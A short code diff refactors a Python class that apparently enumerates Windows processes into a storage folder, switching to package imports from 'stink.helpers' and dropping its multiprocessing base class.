@@ -1,16 +1,14 @@
 from time import sleep
 from os import mkdir, path
-from multiprocessing import Process
 from ctypes import windll, sizeof, byref
 
-from ..helpers import functions
-from ..helpers import ProcessEntry32, ProcessMemoryCountersEx
+from stink.helpers import functions
+from stink.helpers import ProcessEntry32, ProcessMemoryCountersEx
 
 
-class Processes(Process):
+class Processes:
 
     def __init__(self, storage_path: str, folder: str, errors: bool):
-        Process.__init__(self)
 
         self.storage_path = storage_path
         self.folder = folder
